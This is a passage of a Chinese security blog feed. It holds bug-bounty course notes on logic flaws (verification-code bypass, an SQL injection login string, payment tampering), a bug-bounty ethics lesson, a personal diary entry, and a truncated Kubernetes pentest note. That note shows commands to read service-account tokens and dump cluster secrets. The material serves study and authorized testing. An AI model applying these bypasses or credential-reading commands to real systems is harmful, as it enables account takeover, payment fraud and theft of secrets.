title="案例3–只验证了验证码，未做绑定验证"></a>案例3–只验证了验证码，未做绑定验证</h3><p>在手机号收到验证码后，更改手机号。相当于用他人手机号注册账号。</p><h3 id="案例4–修改返回包"><a href="#案例4–修改返回包" class="headerlink" title="案例4–修改返回包"></a>案例4–修改返回包</h3><p>修改返回包：false改为success, true, 400, 200, 0, 1, -1<br>返回包修改方式：在Burp软件的Proxy模块下修改。</p><h3 id="案例5–双写"><a href="#案例5–双写" class="headerlink" title="案例5–双写"></a>案例5–双写</h3><p>示例：</p><p>以上略…<br>Cookie:<br>Connection: keep-alive<br>Content-Type: application&#x2F;x-www-form-urlencoded<br>Content-Length: 60</p><p>mobile&#x3D;13512312312&amp;code&#x3D;12390  (正常情况)<br>mobile&#x3D;13512312312, 13500000000, 13333333333&amp;code&#x3D;12390  (修改方式1)<br>mobile&#x3D;13512312312&amp;mobile&#x3D;13500000000&amp;code&#x3D;12390  (修改方式2)</p><h3 id="案例6–第三方登录"><a href="#案例6–第三方登录" class="headerlink" title="案例6–第三方登录"></a>案例6–第三方登录</h3><p>示例：<br>在第三方平台中登录选择微博登录，然后会返回一个数据包，修改数据包uid即可登录对应的账号（问题在于第三方平台未做好配置）</p><h3 id="案例7–随意验证码"><a href="#案例7–随意验证码" class="headerlink" title="案例7–随意验证码"></a>案例7–随意验证码</h3><p>找回密码，获取验证码，填写任意验证码即可（不管验证码是什么，随便填一个6位数的数字）</p><h3 id="案例8–验证码为空"><a href="#案例8–验证码为空" class="headerlink" title="案例8–验证码为空"></a>案例8–验证码为空</h3><p>找回密码，获取验证码，验证码字段写成null或留空</p><h3 id="案例9–奇葩绕过"><a href="#案例9–奇葩绕过" class="headerlink" title="案例9–奇葩绕过"></a>案例9–奇葩绕过</h3><p>示例：</p><p>找回密码场景中：<br>输入用户名admin，在下发验证码时将手机号改为自己的手机号（返回包中修改），从而利用自己手机号接收验证码，重置他人账号。</p><h3 id="案例10–重置链接"><a href="#案例10–重置链接" class="headerlink" title="案例10–重置链接"></a>案例10–重置链接</h3><p>点击密码重置输入自己的账号，自己邮箱会收到这样的重置链接。</p><h3 id="案例11–万能密码（注入）"><a href="#案例11–万能密码（注入）" class="headerlink" title="案例11–万能密码（注入）"></a>案例11–万能密码（注入）</h3><p>通过asp，aspx，php，jsp等的万能密码登入账号。<br>示例任意用户登录：admin’or’1’&#x3D;’1</p><h3 id="案例12–输入用户名获取当前用户信息"><a href="#案例12–输入用户名获取当前用户信息" class="headerlink" title="案例12–输入用户名获取当前用户信息"></a>案例12–输入用户名获取当前用户信息</h3><p>当在登录口或找回密码界面，输入用户名后，发现自动发送一个请求包检测用户名是否存在，返回包中获得密码或md5加密的密码。</p><h3 id="案例13–修改url跳过步骤"><a href="#案例13–修改url跳过步骤" class="headerlink" title="案例13–修改url跳过步骤"></a>案例13–修改url跳过步骤</h3><p>示例：<br>假设找回密码地址第一步: <code>http://www.xxx.com/u/getpwd1.html</code><br>第一步输入邮箱和验证码开始找回密码，<br>第二步将url参数从2改为3，变成 <code>http://www.xxx.com/u/getpwd3.html</code> ，从而直接到达重置密码的第3步。<br>第三步重置密码，退出后验证是否能够重新登录，如果能则说明存在漏洞。</p><h3 id="案例14–平台存在初始密码，使用爆破手段将全站未修改初始密码的账号获取"><a href="#案例14–平台存在初始密码，使用爆破手段将全站未修改初始密码的账号获取" class="headerlink" title="案例14–平台存在初始密码，使用爆破手段将全站未修改初始密码的账号获取"></a>案例14–平台存在初始密码，使用爆破手段将全站未修改初始密码的账号获取</h3><h3 id="案例15–请求包中存在userid或其它字符，修改userid能以自己账号修改他人密码"><a href="#案例15–请求包中存在userid或其它字符，修改userid能以自己账号修改他人密码" class="headerlink" title="案例15–请求包中存在userid或其它字符，修改userid能以自己账号修改他人密码"></a>案例15–请求包中存在userid或其它字符，修改userid能以自己账号修改他人密码</h3><h3 id="案例16–通用框架漏洞"><a href="#案例16–通用框架漏洞" class="headerlink" title="案例16–通用框架漏洞"></a>案例16–通用框架漏洞</h3><h2 id="越权漏洞-1"><a href="#越权漏洞-1" class="headerlink" title="越权漏洞"></a>越权漏洞</h2><h3 id="案例1–常见id越权"><a href="#案例1–常见id越权" class="headerlink" title="案例1–常见id越权"></a>案例1–常见id越权</h3><p>重点关注的点：<br>收货地址<br>用户<br>编辑<br>预览（草稿回收站）<br>报告（采购）<br>订单（抽奖 付款）</p><h2 id="并发漏洞（30次以内，需代理）"><a href="#并发漏洞（30次以内，需代理）" class="headerlink" title="并发漏洞（30次以内，需代理）"></a>并发漏洞（30次以内，需代理）</h2><h3 id="案例1–成功刷赞"><a href="#案例1–成功刷赞" class="headerlink" title="案例1–成功刷赞"></a>案例1–成功刷赞</h3><p><strong>报告示例</strong> （避开复现过程，审核太弱）<br>标题：xx存在并发刷赞漏洞可随意控制排名<br>自评等级：结合具体情况分析<br>详细内容：来到 <code>http://www.xx.com/1.html</code> , 点赞，抓包<br>【贴上原始页面图片】<br>（贴出的数据包：不带x-req:%s的数据包）<br>直接并发，并发成功，可以看到成功刷赞<br>【贴上刷赞成功页面图片】<br>危害：结合具体情况分析<br>修复建议：数据库加锁</p><h3 id="案例2–签到"><a href="#案例2–签到" class="headerlink" title="案例2–签到"></a>案例2–签到</h3><p>根据危害情况，漏洞危害判定为忽略到高危不等。</p><h3 id="案例3–突破限购"><a href="#案例3–突破限购" class="headerlink" title="案例3–突破限购"></a>案例3–突破限购</h3><h3 id="案例4–突破地址限制"><a href="#案例4–突破地址限制" class="headerlink" title="案例4–突破地址限制"></a>案例4–突破地址限制</h3><h3 id="案例5–文件上传-实际用处不大"><a href="#案例5–文件上传-实际用处不大" class="headerlink" title="案例5–文件上传(实际用处不大)"></a>案例5–文件上传(实际用处不大)</h3><h3 id="案例6–领券"><a href="#案例6–领券" class="headerlink" title="案例6–领券"></a>案例6–领券</h3><h3 id="案例7–刷积分"><a href="#案例7–刷积分" class="headerlink" title="案例7–刷积分"></a>案例7–刷积分</h3><h3 id="案例8–提现"><a href="#案例8–提现" class="headerlink" title="案例8–提现"></a>案例8–提现</h3><h3 id="案例9–抽奖"><a href="#案例9–抽奖" class="headerlink" title="案例9–抽奖"></a>案例9–抽奖</h3><h3 id="案例10–下单"><a href="#案例10–下单" class="headerlink" title="案例10–下单"></a>案例10–下单</h3><h2 id="支付漏洞-1"><a href="#支付漏洞-1" class="headerlink" title="支付漏洞"></a>支付漏洞</h2><h3 id="案例1–负数购买"><a href="#案例1–负数购买" class="headerlink" title="案例1–负数购买"></a>案例1–负数购买</h3><p>正常情况：200(余额)-2*10(单价)&#x3D;180<br>hack：200-(-2)*10&#x3D;220</p><h3 id="案例2–修改内容"><a href="#案例2–修改内容" class="headerlink" title="案例2–修改内容"></a>案例2–修改内容</h3><p>场景：云主机购买逻辑设计不严密，经过base64编码的数据可以被篡改，实现原有买低配的价格可以直接买高配。比如将带宽从5M修改为200M，CPU从2核修改为8核…(价格未变或是降低，算是成功)</p><h3 id="案例3–修改金额"><a href="#案例3–修改金额" class="headerlink" title="案例3–修改金额"></a>案例3–修改金额</h3><ol><li>负数</li><li>金额变小</li><li>小数点前移，从199变成1.99</li><li>修改的金额系统内置：比如一个东西，普通人买100元，员工买1元。</li></ol><p>注意点：修改内容要一一对应，了解逻辑。</p><h3 id="案例4–无限重放-并发"><a href="#案例4–无限重放-并发" class="headerlink" title="案例4–无限重放(并发)"></a>案例4–无限重放(并发)</h3><p>运用场景：优惠券，退款…</p><h3 id="案例5–修改运费"><a href="#案例5–修改运费" class="headerlink" title="案例5–修改运费"></a>案例5–修改运费</h3><h3 id="案例6–修改下单金额"><a href="#案例6–修改下单金额" class="headerlink" title="案例6–修改下单金额"></a>案例6–修改下单金额</h3><h3 id="案例7–正负叠加"><a href="#案例7–正负叠加" class="headerlink" title="案例7–正负叠加"></a>案例7–正负叠加</h3><p>示例：<br>随便购买两件商品，商品为数量一正一负提交订单<br>30(A商品)*1-10(B商品)*2&#x3D;10</p><h3 id="案例8–优惠券漏洞"><a href="#案例8–优惠券漏洞" class="headerlink" title="案例8–优惠券漏洞"></a>案例8–优惠券漏洞</h3><p>抓包修改优惠券金额</p><h3 id="案例9–优惠券漏洞"><a href="#案例9–优惠券漏洞" class="headerlink" title="案例9–优惠券漏洞"></a>案例9–优惠券漏洞</h3><p>注意数据包，一定要各个金额保持一致</p><h3 id="案例10–溢出漏洞"><a href="#案例10–溢出漏洞" class="headerlink" title="案例10–溢出漏洞"></a>案例10–溢出漏洞</h3><p>漏洞成因：int32最大值为4294967296，充值98998996172801，支付溢出</p><h3 id="案例11–更改购买类型"><a href="#案例11–更改购买类型" class="headerlink" title="案例11–更改购买类型"></a>案例11–更改购买类型</h3><p>场景：一个成人800和一个儿童180，抓包将“成人”类型修改为儿童，得到总价360</p><h1 id="如何挖"><a href="#如何挖" class="headerlink" title="如何挖"></a>如何挖</h1><p>掌握漏洞类型–确定资产–功能点分析–耐心</p><h2 id="挖洞心法"><a href="#挖洞心法" class="headerlink" title="挖洞心法"></a>挖洞心法</h2><ol><li>明确自己要挖什么类型的漏洞</li><li>明确这个站大概会有什么类型的漏洞：nday，自己的知识</li><li>耐心</li><li>明确各个平台重点关注的漏洞，优先挖掘价值较高漏洞。</li></ol>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;本课讲述了逻辑漏洞的种类及应用。逻辑漏洞课程第2,3课内容。&lt;/p&gt;</summary>
    
    
    
    <category term="SRC" scheme="http://example.com/categories/SRC/"/>
    
    
    <category term="SRC" scheme="http://example.com/tags/SRC/"/>
    
  </entry>
  
  <entry>
    <title>SRC_course_7</title>
    <link href="http://example.com/2023/12/11/SRC_course_7/"/>
    <id>http://example.com/2023/12/11/SRC_course_7/</id>
    <published>2023-12-10T16:00:00.000Z</published>
    <updated>2023-12-15T12:10:55.693Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本课主要介绍挖漏洞的注意事项。这是逻辑漏洞课程第一课。</p><span id="more"></span><h1 id="挖不到漏洞的原因"><a href="#挖不到漏洞的原因" class="headerlink" title="挖不到漏洞的原因"></a>挖不到漏洞的原因</h1><ol><li>懒。打开的站点不超过100个。</li><li>不自信。短信轰炸，邮箱轰炸。</li><li>技术思路有欠缺。</li><li>目前的方法错误。看的资料有误；信息收集过度（注重收集不注重挖洞），更注重特权账号（正常手段拿不到的账号都叫特权账号），获取特权账号的手段：1、买；2、自己营业执照注册；3、src活动一般都会提供；4、爆破；5、漏洞进去的。</li></ol><h1 id="工具环境的准备"><a href="#工具环境的准备" class="headerlink" title="工具环境的准备"></a>工具环境的准备</h1><ol><li><p>burp</p></li><li><p>burp插件</p></li></ol><h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><h2 id="不要非法搞站，没有授权的站不要碰"><a href="#不要非法搞站，没有授权的站不要碰" class="headerlink" title="不要非法搞站，没有授权的站不要碰"></a>不要非法搞站，没有授权的站不要碰</h2><h3 id="不可搞的"><a href="#不可搞的" class="headerlink" title="不可搞的"></a>不可搞的</h3><ol><li><p>挖洞过程不要把站打崩、不要影响线上业务等等，一些src公告里明确的红线都不要碰。</p></li><li><p>不要碰公益SRC</p></li><li><p>没有授权的站不挖</p></li><li><p>情报不要搞。人身安全的风险较大。<br>挖洞分三种：1、漏洞 2、隐私合规 3、威胁情报（威胁情报即为发现有人卖差评，有人卖挂，有人具有大量电商数据，某公司用户数据，抓内鬼等提交信息即可，能否得钱看运气，可获得几千至几万）</p></li></ol><h3 id="网上的xss盲打平台不要用"><a href="#网上的xss盲打平台不要用" class="headerlink" title="网上的xss盲打平台不要用"></a>网上的xss盲打平台不要用</h3><h3 id="挖授权站的时候，不要动数据、越权修改就修改自己的"><a href="#挖授权站的时候，不要动数据、越权修改就修改自己的" class="headerlink" title="挖授权站的时候，不要动数据、越权修改就修改自己的"></a>挖授权站的时候，不要动数据、越权修改就修改自己的</h3><p>可以自己注册2个账号，删除另一个的账号</p><h3 id="查看SRC公告"><a href="#查看SRC公告" class="headerlink" title="查看SRC公告"></a>查看SRC公告</h3><ol><li><p>注入漏洞不要读表单数据，能证明存在漏洞即可。</p></li><li><p>越权漏洞，查看不超过5组数据</p></li><li><p>自定义严重</p></li><li><p>定级标准</p></li><li><p>奖励</p></li><li><p>范围：根域名，子域名</p></li></ol><h2 id="能搞的"><a href="#能搞的" class="headerlink" title="能搞的"></a>能搞的</h2><h3 id="类似bat-src的企业自建src"><a href="#类似bat-src的企业自建src" class="headerlink" title="类似bat src的企业自建src"></a>类似bat src的企业自建src</h3><p>各大企业src：</p><ol><li>bsrc</li><li>丁香园src</li><li>汽车之家src</li></ol><h3 id="众测平台的私密项目（勿碰公益项目）"><a href="#众测平台的私密项目（勿碰公益项目）" class="headerlink" title="众测平台的私密项目（勿碰公益项目）"></a>众测平台的私密项目（勿碰公益项目）</h3><ol><li><p>漏洞盒子 - 金融类较多 - 难度中等偏上，有能力再尝试</p></li><li><p>补天众测不等于补天平台：1、zf  2、如何参与补天众测（补天众测的白帽子推荐，在补天总榜前300且年度；可以挖到5个以上的企业src的高危漏洞；任意一个大型src年度top3）3、不同级别的人看的项目不同</p></li><li><p>360众测 - 门票ctf</p></li><li><p>火线平台</p></li></ol><h2 id="资产收集"><a href="#资产收集" class="headerlink" title="资产收集"></a>资产收集</h2><ol><li><p>看公告<br>明确资产范围：根域名（ip，子域名）<br>app<br>小程序<br>奖励标准<br>红线</p></li><li><p>根域名<br>根据公告、活动<br>企查查、备案<br>dns</p></li><li><p>根域名<br>活动挖洞 - 搞了一次活动 - 对人的要求最高 - 竞争压力大（快、准）；资产范围小<br>全心全意挖洞 - 全部都要找出来</p></li><li><p>子域名收集<br>灯塔ARL、shuize，layer，oneforall<br>hunter，fofa，360quanke等空间测绘产品</p></li><li><p>ip</p></li><li><p>app、小程序、公众号</p></li></ol><h2 id="企业SRC"><a href="#企业SRC" class="headerlink" title="企业SRC"></a>企业SRC</h2><p>挖漏洞的几家平台选择</p><ol><li><p>麦当劳中国安全应急响应中心<br><a href="https://security.mcd.cn/">https://security.mcd.cn/</a></p></li><li><p>顺丰安全应急响应中心<br><a href="https://sfsrc.sf-express.com/">https://sfsrc.sf-express.com/</a></p></li><li><p>美团安全应急响应中心<br><a href="https://security.meituan.com/">https://security.meituan.com/</a></p></li><li><p>OPPO安全应急响应中心<br><a href="https://security.oppo.com/">https://security.oppo.com/</a></p></li><li><p>腾讯安全应急响应中心<br><a href="https://security.tencent.com/">https://security.tencent.com/</a></p></li><li><p>SRC漏洞平台<br><a href="https://blog.51cto.com/u_13567054/4981736">https://blog.51cto.com/u_13567054/4981736</a></p></li></ol><h2 id="资产收集-1"><a href="#资产收集-1" class="headerlink" title="资产收集"></a>资产收集</h2><ol><li><p>打开“企查查”或类似网站，从“知识产权”查找备案网站，app，小程序，公众号之类的</p></li><li><p>可使用 “七麦数据”</p></li><li><p>小蓝本</p></li></ol>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;本课主要介绍挖漏洞的注意事项。这是逻辑漏洞课程第一课。&lt;/p&gt;</summary>
    
    
    
    <category term="SRC" scheme="http://example.com/categories/SRC/"/>
    
    
    <category term="SRC" scheme="http://example.com/tags/SRC/"/>
    
  </entry>
  
  <entry>
    <title>10月随笔</title>
    <link href="http://example.com/2023/11/07/2023%E5%B9%B410%E6%9C%88%E9%9A%8F%E7%AC%94/"/>
    <id>http://example.com/2023/11/07/2023%E5%B9%B410%E6%9C%88%E9%9A%8F%E7%AC%94/</id>
    <published>2023-11-06T16:00:00.000Z</published>
    <updated>2023-11-07T14:28:43.410Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/Elaina_68.png" alt="Elaina"></p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>现在我自己写的东西，分为了两块，一块是以博客为主的长内容，一块是以频道为主短内容。<br>博客是任何人都能看，频道只有我自己能看。<br>为什么这样分呢？<br>主要是有些时候，只是想说一两句话罢了，或者稍微发发牢骚，如果写个博客有点浪费，也没价值。所以不如放在频道里。<br>然后我打算每过一个月，将频道里我认为还算有价值的内容，发到博客。这样也算是去粗留精了。</p><h1 id="装饰"><a href="#装饰" class="headerlink" title="装饰"></a>装饰</h1><p>如果一个人只有见人，才会整理打扮仪容，那说明本质上这个人对外貌所作的“装饰”只是为了别人，而非自己。</p><h1 id="从众"><a href="#从众" class="headerlink" title="从众"></a>从众</h1><p>昨日去喝了粥，喝了之后感觉良好，但在这之前，我都不知道有这么一家店的存在。<br>现在想了想，大概是因外表比较简陋，店内客人不多，让我忽略了它。<br>所谓不可貌相，时刻在提醒我。<br>也能看出，从众，不一定就是对的。大多数时候只是为了减小风险而做的保守策略罢了，但有时也要敢于冒险。</p><h1 id="文化"><a href="#文化" class="headerlink" title="文化"></a>文化</h1><p>文化是一种影响存在的氛围。</p><h1 id="无聊"><a href="#无聊" class="headerlink" title="无聊"></a>无聊</h1><p>当人工作忙起来了一段日子，再去做一些简单信息量低的事，就会觉得无聊。因为输入小于消化的速度。</p><h1 id="关心"><a href="#关心" class="headerlink" title="关心"></a>关心</h1><p>很多时候，人们询问他人私事只是出于好奇，而非关心。</p><h1 id="价值"><a href="#价值" class="headerlink" title="价值"></a>价值</h1><p>价值，就是创造或延伸一种存在的概念。</p><h1 id="世界"><a href="#世界" class="headerlink" title="世界"></a>世界</h1><p>错的不是我，而是这个世界。</p><p>读完马斯克传后，这句话能理解了。</p><h1 id="紧迫"><a href="#紧迫" class="headerlink" title="紧迫"></a>紧迫</h1><p>不要陷入到一种慢吞吞的节奏中，不要认为什么东西很难，保持紧迫感。</p><h1 id="聊天"><a href="#聊天" class="headerlink" title="聊天"></a>聊天</h1><p>聊天主要带来的就是情绪价值。<br>如果是跟值得的人一起聊，那么或许还能提高认知，获得知识。<br>前者是至少应有的，后者不当过度期望。</p><h1 id="鼻子"><a href="#鼻子" class="headerlink" title="鼻子"></a>鼻子</h1><p>《鼻子》  芥川龙之介<br>我的思考：<br>我自己想要的，真的是我想要的吗？还是别人眼中的自己。<br>融入群体，与他人别无二致，是为了更好的自己，还是为了处于群体中的安心感。</p><h1 id="精力"><a href="#精力" class="headerlink" title="精力"></a>精力</h1><p>我想要让自己时刻保持精力充沛，而不是一天死气沉沉要死不活的样子。</p><p>查阅相关资料与结合个人思考，我认为应该采取以下措施：</p><ol><li>起床后锻炼5分钟</li><li>激烈地表达</li><li>多喝水</li><li>多补充能量</li><li>听摇滚音乐</li><li>一次只做一件事</li><li>再坚持10分钟</li></ol><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>看起来，自己一个月的思考并不多，不知道是因为忙碌，还是因为到了一定程度就开始迟缓呢？<br>10月读了两本书，艾萨克森的《埃隆马斯克传》和芥川龙之介的《罗生门》。前者给了我一些处世哲学的转变，后者给了我自身与人性的思考。<br>10月interview了不少，可惜都没过呢。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/Elaina_68.png&quot; alt=&quot;Elaina&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="随想" scheme="http://example.com/categories/%E9%9A%8F%E6%83%B3/"/>
    
    <category term="10月" scheme="http://example.com/categories/%E9%9A%8F%E6%83%B3/10%E6%9C%88/"/>
    
    
    <category term="随想" scheme="http://example.com/tags/%E9%9A%8F%E6%83%B3/"/>
    
  </entry>
  
  <entry>
    <title>K8s集群安全攻防学习</title>
    <link href="http://example.com/2023/11/02/K8s%E9%9B%86%E7%BE%A4%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2023/11/02/K8s%E9%9B%86%E7%BE%A4%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0/</id>
    <published>2023-11-01T16:00:00.000Z</published>
    <updated>2023-11-02T00:47:28.320Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>因为感觉是一个比较重要的部分，之前接触较少，于是打算系统性地学习一下。</p><span id="more"></span><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h2><p>Container(容器)是一种便携式、轻量级的操作系统级虚拟化技术，它使用namespace隔离不同的软件运行环境，并通过镜像自包含软件的运行环境，从而使得容器可以很方便的在任何地方运行，由于容器体积小且启动快，因此可以在每个容器镜像中打包一个应用程序，这种一对一的应用镜像关系拥有很多好处，使用容器不需要与外部的基础架构环境绑定，因为每一个应用程序都不需要外部依赖，更不需要与外部的基础架构环境依赖，完美解决了从开发到生产环境的一致性问题</p><h2 id="Pod"><a href="#Pod" class="headerlink" title="Pod"></a>Pod</h2><p>Kubernetes使用Pod来管理容器，每个Pod可以包含一个或多个紧密关联的容器，Pod是一组紧密关联的容器集合，它们共享PID、IPC、Network 和UTS Namespace，是Kubernetes调度的基本单位，Pod内的多个容器共享网络和文件系统，可以通过进程间通信和文件共享这种简单高效的方式组合完成服务<br><img src="/simg/K8s-1.png" alt="pod"><br>在Kubernetes中对象使用ManiFest(YAML或JSON)来定义，一个简单的Nginx服务可以定义为nginx.yaml，它包含一个镜像为nginx的容器，示例如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">kind: Pod</span><br><span class="line">metadata:</span><br><span class="line">    name: nginx</span><br><span class="line">    labels:</span><br><span class="line">        app: nginx</span><br><span class="line">spec:</span><br><span class="line">    containers:</span><br><span class="line">    -name: nginx</span><br><span class="line">         image: nginx</span><br><span class="line">         ports:</span><br><span class="line">        -containerPort: 80</span><br></pre></td></tr></table></figure><h2 id="Node"><a href="#Node" class="headerlink" title="Node"></a>Node</h2><p>Node是Pod真正运行的主机，可以是物理机，也可以是虚拟机，为了管理Pod每个Node节点上至少要运行Container Runtime(比如docker或者rkt)、 Kubelet和Kube-proxy服务<br><img src="/simg/K8s-2.png" alt="node"></p><h2 id="Namespace"><a href="#Namespace" class="headerlink" title="Namespace"></a>Namespace</h2><p>Namespace是对一组资源和对象的抽象集合，比如可以用来将系统内部的对象划分为不同的项目组或用户组，常见的pods, services, replication controllers和deployments等都是属于某一个namespace的(默认是default)，而node, persistentVolumes等则不属于任何namespace</p><h2 id="Service"><a href="#Service" class="headerlink" title="Service"></a>Service</h2><p>Service是应用服务的抽象，通过labels为应用提供负载均衡和服务发现，匹配labels的Pod IP和端口列表组成endpoints，由kube-proxy负责将服务IP负载均衡到这些endpoints上，通常每一个Service都会自动分配一个Cluster IP(仅在集群内部可访问的虚拟地址)和DNS名，其他容器可以通过该地址或DNS来访问服务，而不需要了解后端容器的运行：<br><img src="/simg/K8s-2.png" alt="service"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">kind: Service</span><br><span class="line">metadata:</span><br><span class="line">    name: nginx</span><br><span class="line">spec:</span><br><span class="line">    ports:</span><br><span class="line">        - port: 8078 # the port that this service should serve on</span><br><span class="line">        name: http</span><br><span class="line">        # the container on each pod to connect to, can be a name</span><br><span class="line">        # (e.g. &#x27;www&#x27;) or a number (e.g. 80)</span><br><span class="line">        targetPort: 80</span><br><span class="line">        protocol: TCP</span><br><span class="line">    selector:</span><br><span class="line">        app: nginx</span><br></pre></td></tr></table></figure><h1 id="架构概览"><a href="#架构概览" class="headerlink" title="架构概览"></a>架构概览</h1><h2 id="架构源起"><a href="#架构源起" class="headerlink" title="架构源起"></a>架构源起</h2><p>Borg是谷歌内部的大规模集群管理系统，负责对谷歌内部很多核心服务的调度和管理，Borg的目的是让用户能够不必操心资源管理的问题，让他们专注于自己的核心业务，并且做到跨多个数据中心的资源利用率最大化<br>Borg主要由BorgMaster、Borglet、Borgcfg和Scheduler组成，架构示意图如下：<br><img src="/simg/K8s-4.png" alt="borg"><br>Borglet：负责真正运行任务(在容器中)<br>Borgcfg：Borg的命令行工具，用于跟Borg系统交互，一般通过一个配置文件来提交任务<br>Scheduer：负责任务的调度，根据应用的特点将其调度到具体的机器上去<br>BorgMaster：是整个集群的大脑，负责维护整个集群的状态，并将数据持久化到 Paxos 存储中</p><h2 id="架构模型"><a href="#架构模型" class="headerlink" title="架构模型"></a>架构模型</h2><p>K8s借鉴了Borg的设计理念，比如:Pod、Service、Label、单Pod、单IP等，Kubernetes的整体架构跟Borg非常像，如下图所示：<br><img src="/simg/K8s-5.png" alt="k8s"><br>K8s主要由以下几个核心组件组成：<br>etcd：保存了整个集群的状态<br>apiserver：提供了资源操作的唯一入口，并提供认证、授权、访问控制、API 注册和发现等机制<br>controller manager：负责维护集群的状态，比如：故障检测、自动扩展、滚动更新等<br>scheduler：负责资源的调度，按照预定的调度策略将Pod调度到相应的机器上<br>kubelet：负责维护容器的生命周期，同时也负责Volume(CSI)和网络(CNI)的管理<br>Container runtime：负责镜像管理以及Pod和容器的真正运行(CRI)<br>kube-proxy：负责为Service提供cluster内部的服务发现和负载均衡</p><h1 id="核心组件"><a href="#核心组件" class="headerlink" title="核心组件"></a>核心组件</h1><p>Kubernetes主要由以下几个核心组件组成，这也是我们对K8s进行安全评估的主要测试维度：<br>etcd：保存了整个集群的状态<br>apiserver：提供了资源操作的唯一入口，并提供认证、授权、访问控制、API注册和发现等机制<br>controller manager：负责维护集群的状态，比如故障检测、自动扩展、滚动更新等<br>scheduler：负责资源的调度，按照预定的调度策略将Pod调度到相应的机器上<br>kubelet：负责维护容器的生命周期，同时也负责Volume(CVI)和网络(CNI)的管理<br>Container runtime：负责镜像管理以及Pod和容器的真正运行(CRI）<br>kube-proxy：负责为Service提供cluster内部的服务发现和负载均衡</p><p><img src="/simg/K8s-6.png" alt="kubernetes"></p><p>下面是关键组件的一些常用默认端口：<br><img src="/simg/K8s-7.png" alt="Protocol"></p><h1 id="渗透路径"><a href="#渗透路径" class="headerlink" title="渗透路径"></a>渗透路径</h1><p>常见的K8S的渗透路径：<br><img src="/simg/K8s-8.png" alt="path"><br>形象的K8S的渗透过程：<br><img src="/simg/K8s-9.png" alt="path"></p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>我们评估是如果获取到应用的webshell权限时是很有必要判断一下当前的环境的，最狠的一次是之前打HW的时候有厂商搭建了一套完整的域环境的蜜罐系统，看着你打…..，所以这个阶段要做的还是信息收集</p><h2 id="环境信息"><a href="#环境信息" class="headerlink" title="环境信息"></a>环境信息</h2><p><code>env</code><br><img src="/simg/K8s-10.png" alt="env"></p><p><code>env | grep KUBERNETES</code><br><img src="/simg/K8s-11.png" alt="env"></p><h2 id="容器检测"><a href="#容器检测" class="headerlink" title="容器检测"></a>容器检测</h2><p>注意下面的.dockerenv：<br><code>ls -al</code><br><img src="/simg/K8s-12.png" alt="ls"></p><h2 id="内核版本"><a href="#内核版本" class="headerlink" title="内核版本"></a>内核版本</h2><p>需要下载kubectl到pod中，之后通过执行以下命令来获取node节点的内核版本信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl get nodes -o jsonpath=&#x27;&#123;range .items[*]&#125;&#123;.metadata.name&#125;&#123;&quot;\t&quot;&#125;&#123;.status.nodeInfo.kernelVersion&#125;&#123;&quot;\n&quot;&#125;&#123;end&#125;&#x27;</span><br></pre></td></tr></table></figure><p><img src="/simg/K8s-13.png" alt="kubectl"></p><h2 id="Token类"><a href="#Token类" class="headerlink" title="Token类"></a>Token类</h2><p>K8s集群创建的Pod中容器内部默认携带K8s Service Account认证凭据(&#x2F;run&#x2F;secrets&#x2F;kubernetes.io&#x2F;serviceaccount&#x2F;token)，利用该凭据可以认证K8s API-Server服务器并访问高权限接口，如果执行成功意味着该账号拥有高权限，可以直接利用Service Account管理K8s集群<br><code>cat /var/run/secrets/kuberenetes.io/serviceaccount/token</code><br><img src="/simg/K8s-14.png" alt="token"></p><h2 id="Secret类"><a href="#Secret类" class="headerlink" title="Secret类"></a>Secret类</h2><p>K8s Secrets用于存储敏感数据，从Secrets中获取的AK及通信凭证可用户后续渗透中从外部或云产品API窃取信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">命令格式</span></span><br><span class="line">./cdk run k8s-secret-dump (auto|&lt;service-account-token-path&gt;)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用实例</span></span><br><span 